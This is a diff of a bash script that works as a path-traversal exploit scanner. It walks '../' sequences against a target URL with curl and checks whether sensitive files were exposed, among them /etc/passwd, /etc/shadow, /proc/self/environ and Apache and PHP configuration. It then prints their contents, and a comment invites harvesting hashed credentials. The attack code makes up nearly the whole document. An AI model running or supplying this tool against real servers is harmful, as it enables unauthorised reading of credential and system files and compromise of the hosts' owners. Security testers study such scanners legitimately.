@@ -113,55 +113,89 @@ else
 fi
 fi
 
-echo 
-echo "How deep is your love, my deer?" 
+
+declare -A files_indicators
+files_indicators["etc/hosts"]="localhost"
+files_indicators["etc/passwd"]="root:"
+files_indicators["etc/shadow"]="root:"
+files_indicators["proc/self/environ"]="HTTP_USER_AGENT"
+files_indicators["var/log/apache2/access.log"]="GET"
+files_indicators["var/www/html/index.php"]="<?php"
+files_indicators["proc/version"]="Linux version"
+files_indicators["etc/issue"]="welcome"
+files_indicators["etc/apache2/apache2.conf"]="ServerRoot"
+files_indicators["etc/php/php.ini"]="memory_limit"
+
 echo
 echo -e "${YELLOW}If you didn't choose a recursion level it's automatically set to 5${RESET}"
+echo
+echo "How deep is your love, my deer ?"
 echo 
-for ((i=1; i<=depth; i++)); do
-    query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
-    url2="${url}${query}"
-    verbose "${YELLOW}Stade ${i} recursion${RESET}"
-    verbose "$url2" 
-    verbose "Searching for /etc/hosts file..."
-    file=$(curl -s "$url2")
-    if echo "$file" | grep -q -i "localhost" ; then 
-        echo -e "${GREEN}${BOLD}It seems we find something interesting${RESET}"
-        print=$(curl -s "$url2")
-        echo -e "${GREEN}$print${RESET}"
 
-        verbose "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or>
-        
+test_file() {
+    local path=$1
+    local file=$2
+    local indicator=$3
+
+query=$(printf '../%.0s' $(seq 1 $path))$file
+test_url="${url}${query}"
+
+verbose  "${YELLOW}Recursion depth: $path${RESET}"
+verbose  "URL: $test_url"
+response=$(curl -s "$test_url")
+
+#testing if response is True 
+if echo "$response" | grep -q -i "$indicator"; then
+echo 
+echo -e "${GREEN}${BOLD}File found ${RESET}"
+echo -e "${CYAN}${BOLD}Content preview${RESET}"
+echo "- - - - - - - - - - - - - - - - - - - - - "
+echo -e "${BLUE}$(echo "$response" | head -n 5)${RESET}"
+echo "- - - - - - - - - - - - - - - - - - - - - "
+return 0
+else
+verbose "${RED}No file found at this recursion level${RESET}"
+return 1
+fi
+
+} 
+
+#starting main loop 
+found=0
+vuln_depth=0
+
+
+for ((i=1; i<=depth; i++)); do 
+    verbose "${YELLOW}Stade ${i} recursion${RESET}"
+  verbose "$test_url" 
+    verbose "Searching for /etc/hosts file..."
+    if  test_file $i "etc/hosts" "${files_indicators["etc/hosts"]}" ; then
+        vuln_depth="$i"
+        ((found++))
+        echo -e "${GREEN}${BOLD}SUCCESS: Found vulnerable path at recursion level $i${RESET}"
+        break
+    fi
+done
+
+if [ "$vuln_depth" -gt 0 ]; then
+        verbose "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /etc/shadow"
+
 echo
 echo "Have a wonderful look dude"
+for file in "${!files_indicators[@]}"; do
+        if [ "$file" != "etc/hosts" ]; then
+            indicator="${files_indicators[$file]}"
+            if test_file "$vuln_depth" "$file" "$indicator"; then
+                ((found++))
+fi 
+fi  
+    done
 
-        verbose "Let's try something else"
-        echo
-        verbose "Searching for /etc/passwd file..." 
-        query2=$(printf '../%.0s' $(seq 1 $i))"etc/passwd" 
-        url3="${url}${query2}"
-        file2=$(curl -s "$url3")
-        if echo "$file2" | grep -q -i "root" ; then
-            print2=$(curl -s "$url3")
-            echo "Always some interesting stones on the road"
-            echo
-            echo -e "${GREEN}$print2${RESET}"
+echo -e "${GREEN}${BOLD}${found} files found."
+else
 
-            verbose "Trying to find hashed creds (basically searching for /etc/shadow)"
-            query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
-query3=$(printf '../%.0s' $(seq 1 $i))"etc/shadow"
-            url4="${url}${query3}"
-            file3=$(curl "$url4")
-            if echo "$file3" | grep -q -i "root" ; then 
-                print3=$(curl -s "$url4")
-                echo -e "${GREEN}$print3${RESET}"
-            else 
-                verbose  "${RED}No /etc/shadow file found at this recursion level ${RESET}"
-            fi
-        else
-            verbose  "${RED}No /etc/passwd file found.${RESET}"
-        fi
-    else
-        verbose "${RED}Gotta dive deeper, my friend${RESET}"
-    fi 
-done
+echo -e  "$Unfortunately there's nothing to find.{RESET}"
+fi 
+
+exit 0 
+
